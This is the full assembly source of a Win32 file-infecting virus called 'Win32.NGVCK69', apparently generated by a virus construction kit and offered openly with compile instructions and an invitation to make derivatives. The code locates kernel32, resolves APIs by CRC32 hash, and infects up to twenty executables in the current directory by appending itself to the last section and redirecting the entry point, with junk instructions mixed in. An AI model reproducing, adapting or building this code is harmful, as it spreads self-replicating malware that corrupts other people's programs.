              
;
;
; Win32.NGVCK69 by SnakeByte
;
; This Virus is created with the Next Generation VCK by SnakeByte
; to get a copy of this Virus Construction Kit check www.kryptocrew.de/snakebyte/
;
; Virus Description : 
;
;  Virusname              : Win32.NGVCK69
;  Author                 : SnakeByte
;  Operating System       : Win32 ( Win9x, NT, ME, 2000 )
;  Target Files           : Windows Portable Executable
;  Created with           : Next Generation VCK 0.45
;  Creation Date          : 3/12/2015
;  Infection Mark         : NGVC
;  Infection Type         : increasing last section
;  API Search             : CRC32
;  Entry Point Obscurity  : No
;  Locate Kernel by       : using address from stack
;  Anti Bait              : No
;  Travelling             : No
;  Encrypt Hostcode       : No
;  Per-Process Residency  : No
;  SelfMailing            : No
;  mIRC Spreading         : No
;  Trash Ratio            : 1 to 35
;  No. of Files to infect : 20
;
;
;
; Compile this source code with (TASM 5.0) : 
;
;     tasm32 /z /ml /m2 <FileName>,,;
;     tlink32 -Tpe -c <FileName>,<FileName>,, import32.lib
;
; If you edit this source or create another virus from this,
; then please send me a copy so that I know what else I could add
;    Hope you enjoy this ... SnakeByte [ SnakeByte@kryptocrew.de ]
;

.586p
.model flat
jumps
.radix 16

 extrn ExitProcess:PROC

.data
 VirusSize equ (offset EndVirus - offset Virus )
 NumberOfApis equ 10d

VirusCode:
Virus:
 call Delta                             ; Get Delta Offset

Delta:
 sub dword ptr [esp], offset Delta
 pop ebp
 jmp KernelSearchStart


;          [ ///// * FindFiles Procedure * \\\\\ ]


ClearOldData:                           ; we don't want waste in the fields
 pushad
 lea esi, [ebp+WFD_szFileName]
 xchg ecx, esi

                                        ; mov ebx, 276
 mov ebx, ( 276d - 0d )
 add ebx, 0d

ClearOldData2:
 mov byte ptr [ecx], 0h
                                        ; add ecx, 1
 sub ecx, -1d
 dec ebx
 jnz ClearOldData2
 popad
ret
 and dword ptr [ebp+Trash1], 1631487    ; Trash

                                        ; Find the first file
FindFirstFileProc:
 call ClearOldData
 lea ecx, [ebp+WIN32_FIND_DATA]
 xchg ecx, esi

 push esi
 push ebx
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], -1
 and dword ptr [ebp+FindHandle], eax
ret


FindNextFileProc:                       ; find another file
 call ClearOldData
 lea esi, [ebp+WIN32_FIND_DATA]
 xchg ecx, esi

 push ecx
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret





;           [ ///// * Outbreak Procedure * \\\\\ ]


Outbreak:                               ; Lets infect some files...


;   [ ///// * Infect Current Directory Procedure * \\\\\ ]

InfectCurDir:                           ; Infect the current directory
 lea esi, [ebp+filemask]
 xchg esi, ebx

                                        ; Find File to infect
 call FindFirstFileProc
                                        ; add eax, 1
 inc eax
 test eax, eax
 jz EndInfectCurDir
                                        ; Set Infection Counter
                                        ; mov ebx, 20
 mov ebx, 20d
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ebx

InfectCurDirFile:                       ; Infect the file
 call InfectFile
                                        ; Check Infection Counter
 cmp [ebp+InfCounter], 0h
 je EndInfectCurDir
                                        ; find more Files
 call FindNextFileProc
 test eax, eax
 jnz InfectCurDirFile

EndInfectCurDir:
                                        ; Close the Handle
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindClose]

 jmp ExecuteHost


;          [ ///// * Execute Original File * \\\\\ ]

NoKernel:
                                        ; store old EIP and ImageBase
                                        ; clear esi
 mov esi, 29726d
 sub esi, 29726d
 xor esi, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], esi

                                        ; clear eax
 mov eax, 0
 xor eax, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], 0
 sub ebx, 87757490d                     ; Trash
 add dword ptr [ebp+retBase], eax



ExecuteHost:                            ; Start the infected File

                                        ; check if we are first generation
 test ebp, ebp
 jz FirstGenHost
 mov edx,12345678h
 org $-4
 retBase dd 0h
 add edx,12345678h
 org $-4
 retEIP dd 0h
 jmp edx



;      [ ///// * Prepare Infection Procedure * \\\\\ ]

InfectFile:                             ; Infect a file
                                        ; check for maximum filesize
 cmp dword ptr [ebp+WFD_nFileSizeHigh], 0
 jne NoInfection
                                        ; get and remove file attributes
 lea eax, [ebp+WFD_szFileName]
 xchg edx, eax

 push edx
 call dword ptr [ebp+XGetFileAttributesA]
 mov dword ptr [ebp+Attributes], eax
 push 80h
 lea edi, [ebp+WFD_szFileName]
 xchg edx, edi
 or ecx, ebx                            ; Trash


 push edx
 call dword ptr [ebp+XSetFileAttributesA]
 or eax, eax
 jz NoInfection
                                        ; check for minimum filesize
 push dword ptr [ebp+WFD_nFileSizeLow]
 pop edx
 cmp edx, 20000d
 jbe NoInfection
 call OpenFile                          ; open the file
 jc NoInfection
                                        ; check for EXE File
                                        ; mov ecx, -1
 mov ecx, ( -1d + 19d )
 sub ecx, 19d
 and ecx, dword ptr [ebp+MapAddress]
                                        ; check for ZM
 movzx edx, word ptr [ecx]
 sub edx, 'ZM'
 jz Goodfile
 and ebx, edx                           ; Trash
                                        ; mov eax, 23150
 mov eax, 0
 add eax, 23150d
 cmp eax, 0
 jne Notagoodfile
Goodfile:
 cmp word ptr [ecx+3Ch], 0h
 jne _Notagoodfile
 jmp Notagoodfile
_Notagoodfile:
                                        ; clear edi
 mov edi, 0
 add edi, dword ptr [ecx+3Ch]
                                        ; check if header lies inside the file
 cmp dword ptr [ebp+WFD_nFileSizeLow],edi
 jb Notagoodfile
 add edi, ecx
                                        ; check for PE Header
                                        ; check for EP
 cmp word ptr [edi], 'EP'
 je Goodfile2
                                        ; clear eax
 mov eax, 28287d
 sub eax, 28287d
 or eax, eax
 jz Notagoodfile

Goodfile2:
                                        ; check for previous Infection
 cmp dword ptr [edi+4Ch], 'NGVC'
 jz Notagoodfile
 and dword ptr [ebp+Trash1], ebx        ; Trash
 call InfectEXE                         ; Infect the file
 jnc Notagoodfile
                                        ; restore the file attributes
                                        ; mov ebx, -1
 push -1d
 pop ebx
 and ebx, dword ptr [ebp+Attributes]
 push ebx
 lea eax, [ebp+WFD_szFileName]
 xchg eax, ebx

 push ebx
 call dword ptr [ebp+XSetFileAttributesA]
 jmp NoInfection

Notagoodfile:
 call UnMapFile

NoInfection:
ret




;       [ ///// * Create the CRC32 of an API * \\\\\ ]

CRC32:
 pushad
                                        ; mov eax, edi
 push edi
 pop eax
LenCRC:
                                        ; add eax, 1
 sub eax, -1d
 cmp byte ptr [eax], 0
 jne LenCRC
 sub eax, edi
                                        ; mov esi, eax
 mov esi, eax
                                        ; add esi, 1
 add esi, 1d
 cld
                                        ; clear ebx
 and ebx, 0
 add ebx, -1
                                        ; mov ecx, ebx
 mov ecx, ebx
NextByteCRC:
                                        ; clear eax
 sub eax, eax
                                        ; clear edx
 mov edx, 57734d
 sub edx, 57734d
 mov al, byte ptr [edi]
                                        ; add edi, 1
 inc edi
 xor al, bl
 mov bl, bh
 mov bh, cl
 mov cl, ch
 mov ch, 8
NextBitCRC:
 shr dx, 1
 rcr ax, 1
jnc NoCRC
 xor ax,08320h
 xor dx,0EDB8h
NoCRC:
 dec ch
jnz NextBitCRC
 xor ebx, eax
 xor ecx, edx
 dec esi
jnz NextByteCRC
 not ecx
 not ebx
 mov eax, ecx
 rol eax, 16d
 mov ax, bx
 push eax
 pop dword ptr [ebp+APICRC32]
 popad
ret



;          [ ///// * APISearch - Procedure * \\\\\ ]


GetApis:                                ; Retrive the APIs we need


                                        ; number of API's we're looking for
 push NumberOfApis
 pop ecx

                                        ; load API Names and Offsets
 lea eax, [ebp+APIOffsets]
 xchg edi, eax

 lea edx, [ebp+APINames]


GetApisLoop: 

                                        ; search 'em
                                        ; edx points to the CRC
                                        ; edi points to the offset

 call SearchAPI1
                                        ; add edx, 4
 dec edx
 add edx, 5d
                                        ; clear ebx
 sub ebx, ebx
 add ebx, dword ptr [ebp+TempAPI]
 mov dword ptr [edi], ebx
                                        ; add edi, 4
 dec edi
 add edi, 5d
 and eax, 13275468d                     ; Trash
 sub ecx, 1
 jnz GetApisLoop
 mov edi, offset Outbreak
 add edi, ebp

 push edi
ret



;          [ ///// * APISearch 1 Procedure * \\\\\ ]

                                        ; edx Points to API-CRC ( Virus )

SearchAPI1:                             ; Procedure to retrieve API Offsets
 pushad




 mov ebx, dword ptr [ebp+NTableVA]
                                        ; clear the counter
 and word ptr [ebp+counter], 0h


SearchNextApi1:                         ; search for the API's
 mov dword ptr [ebp+NTableTemp], 0
 add dword ptr [ebp+NTableTemp], ebx
 mov eax, dword ptr [ebp+KernelMZ]
 add eax, dword ptr [ebx]
                                        ; mov ebx, eax
 push eax
 pop ebx
                                        ; mov edi, eax
 push eax
 pop edi
 mov dword ptr [ebp+TempApisearch2], 0
 xor dword ptr [ebp+TempApisearch2], edi
 push edx
 pop dword ptr [ebp+TempApisearch3]
 cld

                                        ; edi Points to API-Name ( Kernel )
                                        ; edx Points to API-Name CRC ( Virus )
                                        ; compare Names
                                        ; CRC32 Api Search
 call CRC32
                                        ; mov eax, -1
 mov eax, -1d
 and eax, dword ptr [ebp+APICRC32]
 sub eax, dword ptr [edx]
                                        ; add eax, 1
 inc eax
 dec eax
 jz FoundApi1

ApiNotFound:                            ; we did not find it :(
 mov edx, dword ptr [ebp+TempApisearch3]
 mov edi, dword ptr [ebp+TempApisearch2]
 mov ebx, dword ptr [ebp+NTableTemp]
                                        ; add ebx, 4
 dec ebx
 add ebx, 5d
 sub word ptr [ebp+counter], -1
 cmp word ptr [ebp+counter], 2001h
 jne SearchNextApi1
 jmp NotFoundApi1

FoundApi1:                              ; we found the API
                                        ; clear Stack
                                        ; retrieve the offset
 movzx ebx, word ptr [ebp+counter]
                                        ; point to ordinal Table
 sal ebx, 1                             ; multiply with 2
 add ebx, dword ptr [ebp+OTableVA]
 mov ecx, ebx
 movzx ebx, word ptr [ecx]
 clc
 rcl ebx, 2h
 add ebx, dword ptr [ebp+ATableVA]
                                        ; convert to RVA
 mov ecx, dword ptr [ebx]
 add ecx, dword ptr [ebp+KernelMZ]
 mov dword ptr [ebp+TempAPI], ecx
 popad
ret

NotFoundApi1:
                                        ; we did not get one of the nessecairy API's
                                        ; so we quit !
 pop edi
 popad
 jmp ExecuteHost



;      [ ///// * EXE FILE Infection Procedure * \\\\\ ]

InfectEXE:                              ; infect an exe file
 mov esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header
 mov ebx, [esi+3Ch]
 add ebx, esi
                                        ; get File Alignment
 mov ecx, [ebx+3Ch]
                                        ; clear ebx
 mov ebx, 60117d
 sub ebx, 60117d
 xor ebx, dword ptr [ebp+WFD_nFileSizeLow]
                                        ; calculate new size
 push ecx
 pop dword ptr [ebp+AlignReg2]
 add ebx, VirusSize
 mov dword ptr [ebp+AlignReg1], ebx
 call Align
 push dword ptr [ebp+AlignReg1]
 pop ebx
                                        ; unmap file and map it again with new size
 push ebx
 pop dword ptr [ebp+NewSize]
 pushad
 Call UnMapFile2
 popad
 mov dword ptr [ebp+WFD_nFileSizeLow], 0
 xor dword ptr [ebp+WFD_nFileSizeLow], ebx
 call CreateMap
 jc NoEXE
                                        ; mov esi, -1
 mov esi, 0
 add esi, -1d
 and esi, dword ptr [ebp+MapAddress]
                                        ; retrieve PE - Header again
 mov edi, dword ptr [esi+3Ch]
 add edi, esi
                                        ; infect by increasing the last section
                                        ; clear esi
 push 0
 pop esi
 add esi, edi
                                        ; get last section
                                        ; clear edx
 sub edx, edx
 mov dx, word ptr [esi+06h]
 dec edx
 imul edx, edx, 28h
                                        ; add edi, 120
 inc edi
 add edi, 119d
 add edi, edx
                                        ; clear eax
 and eax, 0
 add eax, dword ptr [esi+74h]
 sal eax, 3
 add edi, eax
                                        ; get old Entrypoint
 mov ebx, dword ptr [esi+34h]
 mov dword ptr [ebp+OldBase], -1
 and dword ptr [ebp+OldBase], ebx
 mov ebx, dword ptr [esi+28h]
 mov dword ptr [ebp+OldEIP], 0
 xor dword ptr [ebp+OldEIP], ebx
 mov ecx, [edi+10h]
                                        ; mov ebx, ecx
 mov ebx, ecx
 add edi, 14h
 add ecx, [edi]
 sub edi, 14h
 xor edx, ebx                           ; Trash
 push ecx
 push ebx
 pop eax
 add eax, [edi+0Ch]
 mov dword ptr [ebp+NewEIP], 0
 xor dword ptr [ebp+NewEIP], eax
                                        ; save new enty point in file
 mov dword ptr [esi+28h], eax
 sar edx, 13d                           ; Trash
 mov eax, [edi+10h]
 push eax
                                        ; calculate new section size
 add eax, VirusSize
 mov dword ptr [ebp+AlignReg1], eax
 push dword ptr [esi+3Ch]
 pop dword ptr [ebp+AlignReg2]
 call Align
                                        ; mov eax, -1
 mov eax, ( -1d + 28d )
 sub eax, 28d
 and eax, dword ptr [ebp+AlignReg1]
 mov dword ptr [edi+10h], eax
 adc edx, 21143550d                     ; Trash
 pop eax
 add eax,  (VirusSize-1014d)
 add eax, 1014d
 mov dword ptr [edi+08h], 0
 add dword ptr [edi+08h], eax
 mov eax, dword ptr [edi+0Ch]
 add eax, dword ptr [edi+10h]
 mov dword ptr [esi+50h], 0h
 add dword ptr [esi+50h], eax
                                        ; set write, read and code flag
 or dword ptr [edi+24h], 0A0000020h
                                        ; set infection mark
 mov dword ptr [esi+4Ch], 0h
 add dword ptr [esi+4Ch], 'NGVC'
                                        ; Append Virus
 pop edi
 mov edx, VirusSize
 mov esi, ebp
 add esi, offset Virus

 add edi, dword ptr [ebp+MapAddress]

AppendLoop:
 movsb
 dec edx
 jnz AppendLoop
                                        ; decrease Infection Counter
 push dword ptr [ebp+InfCounter]
 pop ecx
 add ecx, -1
 mov dword ptr [ebp+InfCounter], -1
 and dword ptr [ebp+InfCounter], ecx
 clc
ret
 adc eax, 96663302d                     ; Trash

NoEXE:
 stc
ret



;                  [ ///// * Data * \\\\\ ]

Data:
 db 'Win32.NGVCK69 created by SnakeByte',0
 filemask    db '*.eXe',0
 Attributes  dd 0h
 KernelPE    dd 0h
 Trash1      dd 0h
 NewSize     dd 0h
 NewEIP      dd 0h
 OTableVA    dd 0h
 AlignReg2   dd 0h
 TempApisearch3 dd 0h
 MapHandle   dd 0h

 APINames:
 dd 094524B42h           ; UnmapViewOfFile
 dd 03C19E536h           ; SetFileAttributesA
 dd 068624A9Dh           ; CloseHandle
 dd 08C892DDFh           ; CreateFileA
 dd 0797B49ECh           ; MapViewOfFile
 dd 096B2D96Ch           ; CreateFileMappingA
 dd 0C633D3DEh           ; GetFileAttributesA
 dd 0AA700106h           ; FindNextFileA
 dd 0AE17EBEFh           ; FindFirstFileA
 dd 0C200BE21h           ; FindClose

 AlignReg1   dd 0h
 ATableVA    dd 0h
 OldBase     dd 400000h
 counter     dw 0h
 KernelMZ    dd 0h
 FILETIME                STRUC
 FT_dwLowDateTime        dd       ?
 FT_dwHighDateTime       dd       ?
 FILETIME ENDS

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 MapAddress  dd 0h
 InfCounter  dd 0h
 APICRC32    dd 0h
 FindHandle  dd 0h
 NTableTemp  dd 0h
 TempAPI     dd 0h

 APIOffsets:
 XUnmapViewOfFile       dd 0h
 XSetFileAttributesA    dd 0h
 XCloseHandle           dd 0h
 XCreateFileA           dd 0h
 XMapViewOfFile         dd 0h
 XCreateFileMappingA    dd 0h
 XGetFileAttributesA    dd 0h
 XFindNextFileA         dd 0h
 XFindFirstFileA        dd 0h
 XFindClose             dd 0h

 TempApisearch2 dd 0h
 FileHandle  dd 0h
 NTableVA    dd 0h
 OldEIP      dd 0h




;        [ ///// * Search Kernel Procedure * \\\\\ ]

KernelSearchStart:
                                        ; get Kernel Adress from Stack
                                        ; --> return Adress to the CreateProcess API
 pop ecx
 push ecx
 mov ebx, edx                           ; Trash
                                        ; store old EIP and ImageBase
 mov ebx, dword ptr [ebp+OldEIP]

 mov dword ptr [ebp+retEIP], 0
 xor dword ptr [ebp+retEIP], ebx

 mov edx, dword ptr [ebp+OldBase]

 mov dword ptr [ebp+retBase], -1
 and dword ptr [ebp+retBase], edx


                                        ; round to pages
 shr ecx, 16d
 rol ecx, 16d
                                        ; add ecx, 1
 sub ecx, -1d
GetKernelLoop:
                                        ; clear eax
 mov eax, 49306d
 sub eax, 49306d
 sub ecx, 1
 mov ax, word ptr [ecx+03ch]
 cmp ax,0f800h
 je GetKernelLoop
 cmp ecx, dword ptr [ecx+eax+34h]
 jnz GetKernelLoop
 push ecx
 pop dword ptr [ebp+KernelMZ]
 mov ebx, ecx
 add ebx, [ecx+3Ch]
 mov [KernelPE+ebp], ebx
                                        ; clear ecx
 push 0
 pop ecx
 add ecx, dword ptr [ebp+KernelPE]
                                        ; get Export-Table
 mov edx, [ecx+78h]
 add edx, [ebp+KernelMZ]
                                        ; add edx, 28
 add edx, 28d
                                        ; get ATableVA
 mov ecx, dword ptr [edx]
                                        ; add edx, 4
 dec edx
 add edx, 5d
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+ATableVA], ecx
                                        ; get NTableVA
 mov ecx, dword ptr [edx]
                                        ; add edx, 4
 add edx, 4d
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+NTableVA], ecx
                                        ; get OTableVA
 mov ecx, dword ptr [edx]
 add ecx, [ebp+KernelMZ]
 mov dword ptr [ebp+OTableVA], ecx
 shr ebx, 8d                            ; Trash
 mov ebx, offset GetApis
 add ebx, ebp

 push ebx
ret

;            [ ///// * Align Procedure * \\\\\ ]

Align:                                  ; align File or Section Size
 pushad
 mov eax, dword ptr [ebp+AlignReg1]
 mov ecx, dword ptr [ebp+AlignReg2]
                                        ; clear edx
 mov edx, 0
 div ecx
                                        ; add eax, 1
 add eax, 1d
 mul ecx
 mov dword ptr [ebp+AlignReg1], eax
 popad
ret



;        [ ///// * File Handling Procedure * \\\\\ ]

                                        ; File Handling
OpenFile:                               ; Open File
                                        ; clear edx
 mov edx, -811d
 add edx, 811d

 push edx
 push edx
 push 3h
 rcl ecx, 11d                           ; Trash
 push edx
                                        ; add edx, 1
 sub edx, -1d
 push edx
 push 80000000h or 40000000h
 lea ebx, [ebp+WFD_szFileName]

 push ebx
 call dword ptr [ebp+XCreateFileA]
 inc ebx                                ; Trash

 inc eax
 jz Closed
 dec eax

 push eax
 pop dword ptr [ebp+FileHandle]

CreateMap:                              ; Map the file
                                        ; clear ecx
 mov ecx, 0
 add ecx, dword ptr [ebp+WFD_nFileSizeLow]
 push ecx
 push 0
 push ecx
 push 0
 push 00000004h
 push 0
 push dword ptr [ebp+FileHandle]
 call dword ptr [ebp+XCreateFileMappingA]
 mov dword ptr [ebp+MapHandle], eax
 pop ecx
 or eax, eax
 jz CloseFile
                                        ; clear eax
 mov eax, 7167d
 sub eax, 7167d
 push ecx
 push eax
 push eax
                                        ; mov ebx, 2
 mov ebx, ( 2d - 20d )
 add ebx, 20d
 push ebx
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XMapViewOfFile]
                                        ; add eax, 1
 sub eax, -1d
 sub eax, 1
 jz UnMapFile
 mov dword ptr [ebp+MapAddress], 0
 add dword ptr [ebp+MapAddress], eax
 clc
ret

UnMapFile:                              ; Unmap the file and store it to disk
 Call UnMapFile2

CloseFile:                              ; Close the file
 push dword ptr [ebp+FileHandle]
 Call [ebp+XCloseHandle]

Closed:
 stc
ret

UnMapFile2:
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XUnmapViewOfFile]
 push dword ptr [ebp+MapHandle]
 call dword ptr [ebp+XCloseHandle]
ret



CryptEnd:
EndVirus:

;          [ //////////////////\\\\\\\\\\\\\\\\\\\ ]
;          [ ///// * First Generation Host * \\\\\ ]


.code                                   ; Lets place some code
                                        ; to start the virus
                                        ; which is inside the
                                        ; data section
FakeCode:

 push offset VirusCode

 ret


FirstGenHost:                           ; exit for the first generation
 rcl ecx, 4d                            ; Trash
 push 0h
 call ExitProcess



end FakeCode

